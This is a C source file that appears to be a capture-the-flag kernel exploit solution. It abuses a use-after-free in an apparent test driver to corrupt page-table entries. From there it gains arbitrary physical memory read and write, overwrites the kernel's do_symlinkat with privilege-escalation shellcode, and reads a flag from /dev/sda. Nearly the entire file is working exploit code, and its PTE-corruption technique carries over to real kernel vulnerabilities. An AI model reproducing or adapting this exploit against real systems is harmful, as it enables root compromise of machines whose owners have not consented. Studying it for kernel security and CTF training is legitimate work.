#include <sched.h>
#include <stdlib.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <unistd.h>

#include "libs/pwn.h"
#include "linux6.12.27/shellcode.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

/*
 * inspired by:
 * https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
 * this version overwrites do_symlinkat with privilige escalation shellcode
 */

// can't call logging helpers directly
//  BUG: Bad page cache in process pwn  pfn:02850

int fd, dmafd, ezfd = -1;
static void win() {
  char buf[0x100] = {0};

  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    puts(LERROR "Lose...");
    exit(EXIT_FAILURE);
  } else {
    puts(LINFO "Win!");
    read(fd, buf, 0x100);
    fputs(LINFO "flag: ", stdout);
    fputs(buf, stdout);
    puts(LINFO "Done");
  }
  exit(EXIT_SUCCESS);
}

u64 user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
  asm("mov %0, cs\n"
      "mov %1, ss\n"
      "mov %2, rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

#define N_SPRAY 0x1000
// size for direct cross cache attack
#define VULN_SIZE 0x100

int main(int argc, char *argv[]) {
  void *keap_ptr;
  u64 pte;
  char leak[VULN_SIZE] = {0};
  char *spray[N_SPRAY];

  lstage("INIT");
  pin_cpu(0, 0);
  save_state();
  init();

  lstage("START");

  for (int i = 0; i < N_SPRAY; i++)
    spray[i] = mmap((void *)(0xdead000000 + i * 0x10000), 0x8000,
                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);

  linfo("create dangeling ptr");
  void *keap_ptrs[N_SPRAY] = {0};
  for (int i = 0; i < N_SPRAY; i++) {
    keap_ptrs[i] = keap_malloc(VULN_SIZE, GFP_KERNEL_ACCOUNT);
  }

  for (int i = 0; i < N_SPRAY; i++) {
    keap_free(keap_ptrs[i]);
    if (i == N_SPRAY / 2) {
      keap_ptr = keap_ptrs[i];
    }
  }

  linfo("spray PTEs");
  for (int i = 0; i < N_SPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(u64 *)(spray[i] + j * 0x1000) = 0x6fe1be2;

#ifdef DEBUG
  keap_read(keap_ptr, leak, VULN_SIZE);
  print_hex(leak, 0x80);
#endif

  keap_read(keap_ptr, &pte, 0x8);
  CHK((char)pte == 0x67);

  linfo("corrupt PTE using UAF with fixed physical address");
  // fixed physical address
  pte = 0x800000000009c067;
  keap_write(keap_ptr, &pte, 0x8);

  linfo("find corrupted page");
  u64 *vuln = 0;
  u64 physbase = 0;
  for (int i = 0; i < N_SPRAY; i++) {
    for (int j = 0; j < 8; j++) {
      if (*(u64 *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
        vuln = (u64 *)(spray[i] + j * 0x1000);
        physbase = (*vuln & ~0xfff);
        break;
      }
    }
    if (physbase)
      break;
  }

  CHK(physbase);

  lhex(physbase);

  linfo("corrupt PTE into AAW/AAR");
  u64 do_symlinkat_func = 0x01e2040;
  u64 modprobe_path = 0x00eade80;
  u64 offset = 0x1804000 - (physbase == 0x2801000 ? 0x3000 : 0);
  for (u64 i = offset; i < 0x10000000; i += 0x1000) {
    offset = i;

    if (i % 0x100000 == 0 && i != 0)
      printf(LINFO "0x%016lx\r", i);

    u64 pte =
        0x8000000000000067 | (physbase + (modprobe_path & ~0xfff) - offset);

    keap_write(keap_ptr, &pte, sizeof(u64));

    // clear TLB
    if (fork() == 0)
      exit(EXIT_SUCCESS);
    wait(NULL);

    if (vuln[(modprobe_path & 0xfff) / 8] == *(u64 *)"/sbin/modprobe")
      break;
  }
  lhex(offset);

  pte = 0x8000000000000067 | (physbase + (do_symlinkat_func & ~0xfff) - offset);

  keap_write(keap_ptr, &pte, 0x8);

  // clear TLB
  if (fork() == 0)
    exit(EXIT_SUCCESS);
  wait(NULL);

#ifdef DEBUG
  keap_read(keap_ptr, leak, VULN_SIZE);
  print_hex(leak, 0x80);
#endif

  lstage("PRIVESC");
  linfo("preparing shellcode");
  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11",
             8);
  *(size_t *)p = getpid();
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22",
             8);
  *(size_t *)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33",
             8);
  *(size_t *)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44",
             8);
  *(size_t *)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55",
             8);
  *(size_t *)p = user_rsp;
  p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66",
             8);
  *(size_t *)p = user_ss;

  linfo("overwriting do_symlinkat_at");
  memcpy(&vuln[(do_symlinkat_func & 0xfff) / sizeof(u64)], shellcode,
         sizeof(shellcode));

  linfo("%d", symlink("/jail/x", "/jail"));
  lerror("Failed...");
}
